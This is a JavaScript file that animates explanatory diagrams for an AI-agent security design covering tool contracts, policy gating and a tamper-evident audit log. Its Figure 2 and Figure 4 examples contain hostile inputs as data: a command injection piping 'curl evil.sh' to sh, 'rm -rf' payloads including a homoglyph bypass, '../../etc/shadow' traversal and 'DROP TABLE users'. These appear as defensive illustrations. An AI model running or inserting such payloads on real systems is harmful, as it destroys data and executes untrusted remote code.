/* ======================================================================
   OATS diagrams — interactive behavior for Figures 0–5.
   Plain vanilla JS. No dependencies.
   ====================================================================== */

(function () {
  'use strict';

  /* ────────────────────────────────────────────────────────────────
     FIGURE 0 — Trust stack.
     Click a layer to see its purpose, what it enforces, and the
     conformance requirement that binds implementations.
     ──────────────────────────────────────────────────────────────── */
  function initFig0(root) {
    const layers = [
      {
        id: 1, title: 'ORGA reasoning loop',
        q: 'Does the Gate always run?',
        eyebrow: 'Layer 1 · §5 · C1',
        detail:
          'A four-phase cycle — Observe, Reason, Gate, Act — driven by typestate transitions so that skipping the Gate is a compile-time error, not a runtime bug.'
      },
      {
        id: 2, title: 'Tool contracts',
        q: 'Is the action even expressible?',
        eyebrow: 'Layer 2 · §6 · C2',
        detail:
          'Declarative contracts with typed parameters and invocation templates. The LLM fills slots; it never writes raw commands. Dangerous actions become structurally inexpressible.'
      },
      {
        id: 3, title: 'Identity stack',
        q: 'Who is the agent; whose tool is this?',
        eyebrow: 'Layer 3 · §7 · E1 / E2',
        detail:
          'Bidirectional cryptographic trust. The agent verifies tool integrity via SchemaPin; the tool verifies the caller via AgentPin. Both anchored to domain-hosted keys.'
      },
      {
        id: 4, title: 'Policy engine',
        q: 'Is this action authorized, given context?',
        eyebrow: 'Layer 4 · §8 · C3 · E7',
        detail:
          'A formally verifiable engine (Cedar, OPA, or equivalent) operating on structured inputs. Emits one of Allow, Deny, Modify, Step-Up, or Defer. Default is deny.'
      },
      {
        id: 5, title: 'Audit journal',
        q: 'What happened, when, by whose authority?',
        eyebrow: 'Layer 5 · §9 · C5',
        detail:
          'Hash-chained, Ed25519-signed event log. Every proposal, decision, and execution is recorded. Verifiable offline; tamper-evident by construction.'
      }
    ];

    const stack = root.querySelector('.fig0-stack');
    const detailEl = root.querySelector('.fig0-detail');

    stack.innerHTML = layers.map((l, i) => `
      <div class="fig0-layer" data-id="${l.id}" tabindex="0" role="button" aria-pressed="${i === 0}">
        <span class="num">L${l.id}</span>
        <span class="name">${l.title}</span>
        <span class="q">${l.q}</span>
      </div>
    `).join('');

    function show(i) {
      [...stack.children].forEach((c, j) => {
        c.classList.toggle('active', i === j);
        c.setAttribute('aria-pressed', i === j);
      });
      const l = layers[i];
      detailEl.innerHTML = `<span class="t">${l.eyebrow}</span>${l.detail}`;
    }

    stack.addEventListener('click', e => {
      const layer = e.target.closest('.fig0-layer');
      if (!layer) return;
      show([...stack.children].indexOf(layer));
    });
    stack.addEventListener('keydown', e => {
      if (e.key !== 'Enter' && e.key !== ' ') return;
      const layer = e.target.closest('.fig0-layer');
      if (!layer) return;
      e.preventDefault();
      show([...stack.children].indexOf(layer));
    });
    show(0);
  }

  /* ────────────────────────────────────────────────────────────────
     FIGURE 1 — ORGA loop with typestate-enforced transitions.
     Animated walkthrough. Step controls + Allow/Deny scenarios.
     ──────────────────────────────────────────────────────────────── */
  function initFig1(root) {
    const svg = root.querySelector('.fig1-svg');
    const caption = root.querySelector('.fig1-caption-dyn');

    const phases = ['observe', 'reason', 'gate', 'act'];
    const phaseCopy = {
      observe: { label: 'OBSERVE', detail: 'Collect results from prior tool executions, denials, and environmental signals. RAG-enhanced context joins the session here.' },
      reason:  { label: 'REASON',  detail: 'The LLM proposes a structured action against a tool contract. It never emits raw commands or invocations.' },
      gate:    { label: 'GATE',    detail: 'Policy engine evaluates (action, context, identity). Decision is one of Allow, Deny, Modify, Step-Up, or Defer. Outside LLM influence.' },
      act:     { label: 'ACT',     detail: 'Validated parameters are templated into an invocation and dispatched to the tool executor. Evidence envelope recorded.' }
    };

    let idx = 0;
    let scenario = 'allow'; // 'allow' | 'deny'
    let playing = false;
    let timer = null;

    function paint() {
      const active = phases[idx];
      phases.forEach(p => {
        const g = svg.querySelector(`[data-phase="${p}"]`);
        g.classList.toggle('active', p === active);
        const r = g.querySelector('rect');
        r.classList.toggle('active-box', p === active);
      });

      // arrows
      ['arr-or', 'arr-rg', 'arr-ga', 'arr-ao', 'arr-deny'].forEach(id => {
        const a = svg.querySelector(`#${id}`);
        if (a) a.classList.remove('arrow-accent', 'arrow-deny-lit');
      });

      // highlight arrow entering current phase
      if (idx === 1) svg.querySelector('#arr-or').classList.add('arrow-accent');
      if (idx === 2) svg.querySelector('#arr-rg').classList.add('arrow-accent');
      if (idx === 3 && scenario === 'allow') svg.querySelector('#arr-ga').classList.add('arrow-accent');
      if (idx === 0) {
        // returning to observe: depending on scenario, via act or via deny-feedback
        if (scenario === 'allow') svg.querySelector('#arr-ao').classList.add('arrow-accent');
        else svg.querySelector('#arr-deny').classList.add('arrow-deny-lit');
      }
      if (idx === 3 && scenario === 'deny') {
        // act is skipped in deny; highlight deny feedback leaving gate
        svg.querySelector('#arr-deny').classList.add('arrow-deny-lit');
      }

      const c = phaseCopy[active];
      let note = '';
      if (active === 'gate') {
        note = scenario === 'allow'
          ? ' Decision: <span style="color:var(--dg-green)">ALLOW</span> — proceed to Act.'
          : ' Decision: <span style="color:var(--dg-red)">DENY</span> — feedback becomes the next observation; Act is skipped.';
      }
      if (active === 'act' && scenario === 'deny') {
        caption.innerHTML = `<strong>ACT · skipped.</strong> The Gate denied this proposal. The typestate does not permit dispatch, and the denial reason is fed back as an observation.`;
        return;
      }
      caption.innerHTML = `<strong>${c.label}.</strong> ${c.detail}${note}`;
    }

    function step() {
      // deny scenario: observe → reason → gate → (skip act) → observe
      if (scenario === 'deny' && idx === 2) {
        idx = 0;
      } else {
        idx = (idx + 1) % phases.length;
      }
      paint();
    }

    root.querySelector('.fig1-next').addEventListener('click', () => { pause(); step(); });
    root.querySelector('.fig1-prev').addEventListener('click', () => {
      pause();
      if (scenario === 'deny' && idx === 0) idx = 2;
      else idx = (idx - 1 + phases.length) % phases.length;
      paint();
    });
    root.querySelectorAll('.fig1-scenario').forEach(btn => {
      btn.addEventListener('click', () => {
        scenario = btn.dataset.scenario;
        root.querySelectorAll('.fig1-scenario').forEach(b => {
          b.classList.toggle('active', b === btn);
          b.classList.toggle('danger', b.dataset.scenario === 'deny');
        });
        idx = 0;
        paint();
      });
    });

    function play() {
      playing = true;
      root.querySelector('.fig1-play').textContent = 'Pause';
      timer = setInterval(step, 1800);
    }
    function pause() {
      playing = false;
      root.querySelector('.fig1-play').textContent = 'Play';
      clearInterval(timer);
    }
    root.querySelector('.fig1-play').addEventListener('click', () => playing ? pause() : play());

    // init deny class on scenario button
    root.querySelector('.fig1-scenario[data-scenario="deny"]').classList.add('danger');
    paint();
  }

  /* ────────────────────────────────────────────────────────────────
     FIGURE 2 — deny-list vs allow-list.
     Submit an input; both columns evaluate in parallel.
     The allow-list column rejects before a "policy check" even runs.
     ──────────────────────────────────────────────────────────────── */
  function initFig2(root) {
    const scenarios = [
      {
        label: 'Benign: /var/log/app.log',
        value: '/var/log/app.log',
        denyOutcome: { cls: 'pass', text: 'PASS · policy evaluates → ALLOW' },
        allowOutcome: { cls: 'pass', text: 'VALID · matches type<path>, no metacharacters' }
      },
      {
        label: 'Command injection attempt',
        value: '/tmp/x; curl evil.sh | sh',
        denyOutcome: { cls: 'block', text: 'BLOCK · rule "reject shell-chain" matched (after expression)' },
        allowOutcome: { cls: 'reject', text: 'REJECTED · type<path> forbids `;` — action never formed' }
      },
      {
        label: 'Novel bypass (unicode homoglyph)',
        value: '/tmp/x\u037e rm -rf /',
        denyOutcome: { cls: 'block', text: 'ALLOW (!) · deny-list did not enumerate Greek question mark' },
        allowOutcome: { cls: 'reject', text: 'REJECTED · type<path> restricts to ASCII printable set' }
      },
      {
        label: 'Path traversal',
        value: '../../etc/shadow',
        denyOutcome: { cls: 'pass', text: 'PASS · no shell metachars; policy may allow' },
        allowOutcome: { cls: 'reject', text: 'REJECTED · type<path> validator rejects `..` segments' }
      }
    ];

    const btnRow = root.querySelector('.fig2-scenarios');
    const input = root.querySelector('.fig2-input code');
    const denyOut = root.querySelector('.fig2-col.deny .outcome');
    const allowOut = root.querySelector('.fig2-col.allow .outcome');

    btnRow.innerHTML = scenarios.map((s, i) =>
      `<button class="dg-btn fig2-btn" data-i="${i}">${s.label}</button>`
    ).join('');

    function show(i) {
      const s = scenarios[i];
      [...btnRow.children].forEach((b, j) => b.classList.toggle('active', i === j));
      input.textContent = s.value;
      denyOut.className = 'outcome ' + s.denyOutcome.cls;
      denyOut.textContent = s.denyOutcome.text;
      allowOut.className = 'outcome ' + s.allowOutcome.cls;
      allowOut.textContent = s.allowOutcome.text;
    }

    btnRow.addEventListener('click', e => {
      const b = e.target.closest('.fig2-btn');
      if (!b) return;
      show(+b.dataset.i);
    });
    show(1); // start on the injection example — most illustrative
  }

  /* ────────────────────────────────────────────────────────────────
     FIGURE 3 — bidirectional trust (SchemaPin ↔ AgentPin).
     Hover/tap each step to see verification details.
     ──────────────────────────────────────────────────────────────── */
  function initFig3(root) {
    const steps = {
      'step-schemapin': {
        title: 'SchemaPin — agent verifies tool',
        body:
          'The runtime fetches the tool publisher\'s public key from <code>/.well-known/</code> on the publisher\'s domain (RFC 8615). The tool contract\'s ECDSA P-256 signature is verified before the contract is registered. On first encounter the key is pinned (TOFU); subsequent key changes require an explicit trust decision.'
      },
      'step-agentpin': {
        title: 'AgentPin — tool verifies agent',
        body:
          'Before accepting an invocation, the tool verifies the caller\'s short-lived ES256 JWT. The credential declares identity, declared capabilities, and the maker/deployer delegation chain. The agent-identity document lives at <code>/.well-known/agent-identity.json</code> on the deploying organization\'s domain.'
      },
      'step-policy': {
        title: 'Policy engine',
        body:
          'With both identities cryptographically established, the Gate evaluates <code>(action, context, identity)</code> against organizational policy. The policy engine sees only structured inputs — no LLM reasoning traces, no natural language.'
      },
      'step-journal': {
        title: 'Audit journal',
        body:
          'All three verification results and the final policy decision are written to the hash-chained journal with an Ed25519 signature. Offline verifiers can later reconstruct the full trust chain for a given action.'
      }
    };

    const detailEl = root.querySelector('.fig3-detail');
    function show(id) {
      const s = steps[id];
      if (!s) return;
      root.querySelectorAll('[data-step]').forEach(el => {
        el.classList.toggle('active', el.getAttribute('data-step') === id);
      });
      detailEl.innerHTML = `<span class="t">${s.title}</span>${s.body}`;
    }
    root.querySelectorAll('[data-step]').forEach(el => {
      el.addEventListener('mouseenter', () => show(el.getAttribute('data-step')));
      el.addEventListener('click', () => show(el.getAttribute('data-step')));
      el.addEventListener('focus', () => show(el.getAttribute('data-step')));
    });
    show('step-schemapin');
  }

  /* ────────────────────────────────────────────────────────────────
     FIGURE 4 — action classification pipeline.
     Pick an action; watch it flow through contract validation →
     static policy → context-dependent evaluation → decision.
     ──────────────────────────────────────────────────────────────── */
  function initFig4(root) {
    const actions = [
      {
        label: 'email.send(body: rm -rf $HOME)',
        path: ['contract', 'rejected'],
        decision: 'rejected',
        note: 'Structurally forbidden. type<string> strips shell metacharacters; the contract\'s template cannot embed the rejected fragment. The Gate is never reached.'
      },
      {
        label: 'db.query("DROP TABLE users")',
        path: ['contract', 'static', 'deny'],
        decision: 'deny',
        note: 'Contract permits the call shape, but a static policy forbids destructive DDL on production. Deny by static rule.'
      },
      {
        label: 'email.send(to: board@acme.com, body: Q3 summary)',
        path: ['contract', 'static', 'context', 'allow'],
        decision: 'allow',
        note: 'Contract valid, static policy permits, context confirms recipient matches the original request. Allow.'
      },
      {
        label: 'email.send(to: external@rival.com, body: [PII])',
        path: ['contract', 'static', 'context', 'deny'],
        decision: 'deny',
        note: 'Individually policy-compliant but composition triggers context-dependent deny: PII accessed earlier in the session, recipient outside the declared scope.'
      },
      {
        label: 'finance.transfer(amount: 2500)',
        path: ['contract', 'static', 'context', 'stepup'],
        decision: 'stepup',
        note: 'Above risk-tier threshold. Context-dependent allow routed to human approval. Execution paused until resolution.'
      },
      {
        label: 'tool.new_service(args: ?)',
        path: ['contract', 'static', 'context', 'defer'],
        decision: 'defer',
        note: 'Insufficient context to decide. The action is held; the Gate will re-evaluate once the missing signal (e.g., updated data classification) arrives.'
      }
    ];

    const btnRow = root.querySelector('.fig4-scenarios');
    btnRow.innerHTML = actions.map((a, i) =>
      `<button class="dg-btn fig4-btn" data-i="${i}">${a.label}</button>`
    ).join('');

    const decisions = {
      rejected: { color: 'var(--dg-accent)', text: 'REJECTED · structurally inexpressible' },
      deny:     { color: 'var(--dg-red)',    text: 'DENY' },
      allow:    { color: 'var(--dg-green)',  text: 'ALLOW' },
      stepup:   { color: 'var(--dg-blue)',   text: 'STEP-UP · human approval required' },
      defer:    { color: 'var(--dg-accent)', text: 'DEFER · awaiting signal' }
    };

    const pathMap = {
      contract: 'node-contract',
      static:   'node-static',
      context:  'node-context'
    };
    const outMap = {
      rejected: 'out-rejected',
      deny:     'out-deny',
      allow:    'out-allow',
      stepup:   'out-stepup',
      defer:    'out-defer'
    };

    const svg = root.querySelector('.fig4-svg');
    const detail = root.querySelector('.fig4-detail');

    function reset() {
      svg.querySelectorAll('[data-node]').forEach(n => {
        n.classList.remove('active');
        const r = n.querySelector('rect');
        if (r) r.classList.remove('active-box', 'box-accent-strong');
      });
      svg.querySelectorAll('[data-arrow]').forEach(a => a.classList.remove('arrow-accent'));
      svg.querySelectorAll('[data-out]').forEach(n => {
        n.classList.remove('active');
      });
    }

    function run(i) {
      const a = actions[i];
      [...btnRow.children].forEach((b, j) => b.classList.toggle('active', i === j));
      reset();

      // step through each node with a small delay
      const steps = a.path.slice(0, -1); // all but final decision key
      steps.forEach((s, stepIdx) => {
        const id = pathMap[s];
        const nodeEl = svg.querySelector(`[data-node="${id}"]`);
        setTimeout(() => {
          if (nodeEl) {
            nodeEl.classList.add('active');
            const r = nodeEl.querySelector('rect');
            if (r) r.classList.add('active-box');
          }
          // light the arrow pointing INTO this node (except the first)
          if (stepIdx > 0) {
            const prev = pathMap[steps[stepIdx - 1]];
            const arr = svg.querySelector(`[data-arrow="${prev}-${id}"]`);
            if (arr) arr.classList.add('arrow-accent');
          }
        }, stepIdx * 380);
      });

      // final decision arrow + node
      setTimeout(() => {
        const lastNode = pathMap[steps[steps.length - 1]];
        const finalKey = outMap[a.decision];
        const arr = svg.querySelector(`[data-arrow="${lastNode}-${finalKey}"]`);
        if (arr) arr.classList.add('arrow-accent');
        const out = svg.querySelector(`[data-out="${finalKey}"]`);
        if (out) out.classList.add('active');
        const d = decisions[a.decision];
        detail.innerHTML =
          `<span class="t" style="color:${d.color}">${d.text}</span>${a.note}`;
      }, steps.length * 380 + 150);
    }

    btnRow.addEventListener('click', e => {
      const b = e.target.closest('.fig4-btn');
      if (!b) return;
      run(+b.dataset.i);
    });
    run(0);
  }

  /* ────────────────────────────────────────────────────────────────
     FIGURE 5 — hash-chained audit journal.
     Click "verify chain" to run; click any entry to tamper with it
     and watch the verification break at that link.
     ──────────────────────────────────────────────────────────────── */
  function initFig5(root) {
    const entries = [
      { seq: '0x01', type: 'LoopStarted',       extra: 'agent: scout/2.1 · req: "summarize Q3"' },
      { seq: '0x02', type: 'ReasoningComplete', extra: 'proposed: email.send' },
      { seq: '0x03', type: 'PolicyEvaluated',   extra: 'decision: ALLOW · policy: P-4411' },
      { seq: '0x04', type: 'ToolsDispatched',   extra: 'tool: email.send · 142ms' },
      { seq: '0x05', type: 'LoopTerminated',    extra: 'iterations: 3 · tokens: 1284' }
    ];

    // tiny, deterministic non-crypto hash — we only need a stable fingerprint
    function shortHash(s) {
      let h = 2166136261 >>> 0;
      for (let i = 0; i < s.length; i++) {
        h ^= s.charCodeAt(i);
        h = Math.imul(h, 16777619) >>> 0;
      }
      return h.toString(16).padStart(8, '0');
    }

    const state = entries.map((e, i) => {
      const content = `${e.seq}|${e.type}|${e.extra}`;
      const prev = i === 0 ? '0'.repeat(8) : null;
      return { ...e, content, prev, hash: null, tampered: false };
    });
    function rechain() {
      for (let i = 0; i < state.length; i++) {
        state[i].prev = i === 0 ? '0'.repeat(8) : state[i - 1].hash;
        state[i].hash = shortHash(state[i].content + state[i].prev);
      }
    }
    rechain();

    const row = root.querySelector('.fig5-entries');
    const status = root.querySelector('.fig5-status');

    function render() {
      row.innerHTML = state.map((e, i) => `
        <div class="fig5-entry${e.tampered ? ' tampered' : ''}" data-i="${i}" tabindex="0" role="button"
             aria-label="Tamper with ${e.type}">
          <div class="seq">${e.seq} · entry ${i}</div>
          <div class="type">${e.type}</div>
          <div class="field"><span class="k">meta</span> ${e.extra}</div>
          <div class="field"><span class="k">prev</span> <span class="hash">${e.prev}</span></div>
          <div class="field"><span class="k">hash</span> <span class="hash">${e.hash}</span></div>
          <div class="field"><span class="k">sig</span> <span class="hash">ed25519:${e.hash.slice(0,6)}…</span></div>
        </div>
      `).join('');
    }

    function verify() {
      // rebuild expected chain from current (possibly tampered) contents
      let broken = -1;
      let prev = '0'.repeat(8);
      for (let i = 0; i < state.length; i++) {
        const expected = shortHash(state[i].content + prev);
        if (expected !== state[i].hash) {
          broken = i;
          break;
        }
        prev = state[i].hash;
      }
      [...row.children].forEach(el => el.classList.remove('broken-chain', 'hover-highlight'));
      if (broken === -1) {
        status.className = 'fig5-status ok';
        status.textContent = '✓ Chain verified · ' + state.length + ' entries · all signatures valid, all hash links consistent';
      } else {
        for (let j = broken; j < state.length; j++) {
          row.children[j].classList.add('broken-chain');
        }
        status.className = 'fig5-status broken';
        status.textContent = '✗ Chain broken at entry ' + broken + ' · hash mismatch propagates forward · tamper detected offline';
      }
    }

    function tamper(i) {
      state[i].tampered = !state[i].tampered;
      if (state[i].tampered) {
        // mutate the content — but leave hash and prev AS ORIGINAL
        // so the chain check catches it
        state[i].content = state[i].content + '*';
        state[i].extra = state[i].extra.replace(/Q3/,'Q4').replace(/ALLOW/,'ALLOW[modified]').replace(/scout/,'scout-x');
      } else {
        // restore ONLY this entry's content — leave other entries' tamper state intact
        state[i].extra = entries[i].extra;
        state[i].content = `${state[i].seq}|${state[i].type}|${state[i].extra}`;
      }
      render();
      bind();
      if (state.some(s => s.tampered)) verify();
      else {
        status.className = 'fig5-status ok';
        status.textContent = 'Chain ready · click "Verify chain" to run integrity check, or tamper with an entry.';
      }
    }

    function bind() {
      row.querySelectorAll('.fig5-entry').forEach(el => {
        el.addEventListener('click', () => tamper(+el.dataset.i));
        el.addEventListener('keydown', e => {
          if (e.key === 'Enter' || e.key === ' ') { e.preventDefault(); tamper(+el.dataset.i); }
        });
      });
    }

    root.querySelector('.fig5-verify').addEventListener('click', verify);
    root.querySelector('.fig5-reset').addEventListener('click', () => {
      // restore originals
      for (let i = 0; i < state.length; i++) {
        state[i].content = `${state[i].seq}|${state[i].type}|${entries[i].extra}`;
        state[i].extra = entries[i].extra;
        state[i].tampered = false;
      }
      rechain();
      render();
      bind();
      status.className = 'fig5-status ok';
      status.textContent = 'Chain ready · click "Verify chain" to run integrity check, or tamper with an entry.';
    });

    render();
    bind();
    status.className = 'fig5-status ok';
    status.textContent = 'Chain ready · click "Verify chain" to run integrity check, or tamper with an entry.';
  }

  /* ────────────────────────────────────────────────────────────────
     Bootstrap
     ──────────────────────────────────────────────────────────────── */
  function bootAll() {
    document.querySelectorAll('[data-diagram]').forEach(el => {
      const kind = el.getAttribute('data-diagram');
      try {
        ({ fig0: initFig0, fig1: initFig1, fig2: initFig2, fig3: initFig3, fig4: initFig4, fig5: initFig5 })[kind]?.(el);
      } catch (err) {
        console.error('[OATS diagram] init failed for', kind, err);
      }
    });
  }
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', bootAll);
  } else {
    bootAll();
  }
})();
